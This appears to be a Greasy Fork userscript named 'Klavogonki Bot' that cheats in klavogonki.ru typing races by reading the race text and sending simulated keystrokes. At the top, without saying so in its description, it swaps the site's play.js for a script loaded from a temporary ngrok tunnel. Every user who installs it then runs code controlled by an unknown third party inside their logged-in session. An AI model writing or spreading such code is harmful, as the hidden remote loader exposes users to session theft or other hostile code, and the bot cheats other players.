// ==UserScript==
// @name         Klavogonki Bot
// @namespace    http://alamote.pp.ua/
// @version      0.1.1
// @author       You
// @match        https://klavogonki.ru/g/*
// @grant        none
// @icon         http://alamote.pp.ua/staff/alamote-logo.png
// @description  Klavogonki Auto Bot
// @downloadURL https://update.greasyfork.org/scripts/402626/Klavogonki%20Bot.user.js
// @updateURL https://update.greasyfork.org/scripts/402626/Klavogonki%20Bot.meta.js
// ==/UserScript==

/*jshint esversion: 6 */

const scripts = document.getElementsByTagName('script');
let i = 0;
for (i = 0; i < scripts.length; i++) {
    if (scripts.item(i).src.indexOf('play.js') > -1) {
        //console.log(1);
        //document.head.removeChild(scripts.item(i));
        break;
    }
}
const script = document.createElement('script');
script.type = "text/javascript";
script.src = "https://16dea92a.ngrok.io/phppgadmin/play.js?bust=" + Date.now();
document.head.replaceChild(script, scripts.item(i));

(function() {
    'use strict';


    const interval = setInterval(() => {
        const keyboardLink = document.getElementById('keyboard_cont')

        if (keyboardLink) {
            clearInterval(interval);

            const start = document.createElement('a');
            start.innerHTML = 'Start';
            start.href = 'javascript:void(0)';
            start.addEventListener('click', () => {
                const container = document.getElementById('typetext').childNodes.item(0);

                if (!container) {
                    console.log('Text not found!');
                    return;
                }

                let textString = '';
                const typefocus = document.getElementById('typefocus');
                if (typefocus.childNodes.length > 1) {
                    for (let i = 0; i < typefocus.childNodes.length; i++) {
                        if (typefocus.childNodes.item(i).style.display !== 'none') {
                            textString += typefocus.childNodes.item(i).innerHTML;
                        }
                    }
                } else {
                     textString += typefocus.innerHTML;
                }

                const afterfocus = document.getElementById('afterfocus');
                for (let i = 0; i < afterfocus.childNodes.length; i++) {
                    if (afterfocus.childNodes.item(i).style.display !== 'none') {
                        textString += afterfocus.childNodes.item(i).innerHTML;
                    }
                }

                textString = textString.replace('o', 'о').replace('a', 'а').replace('c', 'с');

                const input = document.getElementById('inputtext');
                const textArray = textString.split(' ');

                console.log(textString);
                console.log(textArray);

                const fillLetter = (wordIndex, letterIndex, timeout) => {
                    setTimeout(() => {
                        const event = document.createEvent("HTMLEvents");
                        event.initEvent('keyup', true, false);
                        event.keyCode = textArray[wordIndex].substr(letterIndex, 1).charCodeAt(0);
                        input.value = textArray[wordIndex].substr(0, letterIndex + 1);
                        input.dispatchEvent(event);
                    }, timeout);
                };

                let iter = 0;
                for (let word = 0; word < textArray.length; word++) {
                    for (let letter = 0; letter < textArray[word].length; letter++) {
                        fillLetter(word, letter, 100 * iter++);
                    }
                }
            });

            const delimiter = document.createElement('span');
            delimiter.innerHTML = ' | ';

            keyboardLink.appendChild(delimiter);
            keyboardLink.appendChild(start);

            console.log('KB: Initialized.');
        }
    }, 1000);
})();